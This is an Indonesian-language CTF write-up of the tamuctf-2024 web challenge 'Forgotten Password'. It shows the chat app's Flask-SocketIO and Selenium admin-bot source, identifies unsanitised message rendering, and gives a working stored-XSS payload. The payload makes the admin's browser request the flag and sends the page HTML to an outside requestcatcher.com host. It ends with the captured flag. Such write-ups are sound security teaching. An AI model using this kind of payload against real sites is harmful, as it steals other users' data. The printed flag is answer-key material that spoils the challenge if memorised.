# Forgotten Password - Web - tamuctf-2024

Pada challenge kali ini kita dihadapkan aplikasi yang mirip seperti discord, kita bisa melakukan chatting dan ketika kita memasukan `/flag`, maka sistem akan memunculkan flag, namun hanya admin yang bisa membaca flag tersebut. terdapat juga kerentanan `XSS` yang bisa kita manfaatkan untuk memaksa admin untuk membuka kan `flag` untuk kita dan mengirimkannya ke `webhook`.

## Source Code
### Events.py
```python
from src import socketio, db
from src.util.db_schema import Submission
from src.util.bot import view_message

from flask_socketio import emit, join_room
from flask_login import current_user, login_required
from flask import current_app
from time import sleep


@socketio.on('join')
@login_required
def handle_join():
    join_room(current_user.username)


@socketio.on('json')
@login_required
def handle_message(json):
    if json['message'] != '':
        text = json['message']
        time = json['time']
        dst = json['to']
        src = current_user.username

        message_content = f"""
            <div class="message">
                <span class="sender">{src}</span>
                <span class="timestamp">{time}</span>
                <p>{text}</p>
            </div>
        """

        emit('message', {'to': dst, 'from': src, 'content': message_content}, room=dst)
        if dst != src:
            sleep(0.5)
            emit('message', {'to': src, 'from': src, 'content': message_content}, room=src)

        if dst == 'admin#0000' and '<' in text:
            submission = Submission(message=text)
            db.session.add(submission)
            db.session.commit()
            view_message(submission.id)


@socketio.on('flag')
@login_required
def flag_command():
    msg = 'Only admin#0000 can view the flag.'
    if current_user.username == "admin#0000":
        msg = current_app.config['FLAG']

    message_content = f"""
        <div class="message">
            <span class="sender">System</span>
            <p>{msg}</p>
        </div>
    """

    emit('message', {'to': current_user.username, 'from': current_user.username, 'content': message_content}, room=current_user.username)
```
Berdasarkan kode diatas, terlihat bahwa message yang kita masukan akan langsung di masukan ke html tanpa adanya sanitasi, ini bisa kita manfaatkan untuk melakukan serangan `XSS`

### Bot.py
```python
from src.util.db_schema import User

from selenium import webdriver
from flask import current_app
from flask.sessions import SecureCookieSessionInterface

import time


def generate_admin_cookie():
    admin = User.query.filter_by(username='admin#0000').first()
    session = {'_user_id': admin.uid}
    session_interface = SecureCookieSessionInterface()
    return session_interface.get_signing_serializer(current_app).dumps(dict(session))


def view_message(submission_id):
    chrome_options = webdriver.ChromeOptions()
    chrome_options.add_argument('--headless')
    chrome_options.add_argument('--incognito')
    chrome_options.add_argument('--no-sandbox')
    chrome_options.add_argument('--disable-setuid-sandbox')
    chrome_options.add_argument('--disable-gpu')
    chrome_options.add_argument('--disable-dev-shm-usage')
    chrome_options.add_argument('--disable-background-networking')
    chrome_options.add_argument('--disable-extensions')
    chrome_options.add_argument('--disable-sync')
    chrome_options.add_argument('--disable-translate')
    chrome_options.add_argument('--metrics-recording-only')
    chrome_options.add_argument('--mute-audio')
    chrome_options.add_argument('--no-first-run')
    chrome_options.add_argument('--safebrowsing-disable-auto-update')
    chrome_options.add_argument('--js-flags=--noexpose_wasm,--jitless')

    client = webdriver.Chrome(options=chrome_options)
    client.set_page_load_timeout(5)
    client.set_script_timeout(10)

    payload = f'http://localhost:{current_app.config["PORT"]}/botview/{submission_id}'

    client.get('http://localhost:8000/')
    client.add_cookie({'name': 'session', 'value': generate_admin_cookie()})
    client.get(payload)
    time.sleep(5)

    client.quit()
```
Pada kode diatas, terdapat Bot yang akan melakukan`view_message`, selama message yang kita kirimkan menuju ke user `admin#0000` atau di dalam text mengandung `<`, maka admin akan melakukan `view_message` message yang kita kirimkan.

Artinya jika kita melakukan serangan `XSS` dan menambahkan `socket.emit('flag')` pada payload `XSS`, maka payload `XSS` ini akan di execute di browser admin juga, dan admin akan membacakan flag untuk kita dan mengirimkannya ke webhook.

## Get The Flag
Masuk ke halaman chat dan masukan payload XSS berikut
```html
<img src=x onerror="setTimeout(()=>{socket.emit('flag');setTimeout(()=>{navigator.sendBeacon('https://bianapis.requestcatcher.com/test?',document.body.innerHTML)},500);},500)">
```

```html
          <strong>admin#0000</strong>
        </a>
        <ul class="dropdown-menu dropdown-menu-dark text-small shadow" aria-labelledby="dropdownUser1">
          <li><a id="logout-button" class="dropdown-item" href="/api/auth/logout">Sign out</a></li> 
        </ul>
      </div>
    </div>
    <div class="container">
      <div id="chat" class="chat">
        <img src="x" onerror="setTimeout(()=>{socket.emit('flag');setTimeout(()=>{navigator.sendBeacon('https://bianapis.requestcatcher.com/test?',document.body.innerHTML)},500);},500)">
      
        <div class="message">
            <span class="sender">System</span>
            <p>gigem{its_like_xss_but_with_extra_steps}</p>
        </div>
    </div>
      <input id="message-box" type="text" class="message-box" placeholder="Message">
    </div>
    <div class="modal fade" id="new-dm" tabindex="-1">
      <div class="modal-dialog modal-dialog-centered">
        <div class="modal-content" style="background: #1e2124 !important;">
          <div class="modal-header" style="border: none">
            <h1 class="modal-title fs-5 text-white">Start DM</h1>
            <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
          </div>
          <div class="modal-body">
            <input id="new-dm-box" type="text" class="message-box" placeholder="example#1234">
          </div>
          <div class="modal-body">
            <button type="button" class="btn btn-primary" data-bs-dismiss="modal" onclick="new_dm()">Add</button>
          </div>
        </div>
      </div>
    </div>
```
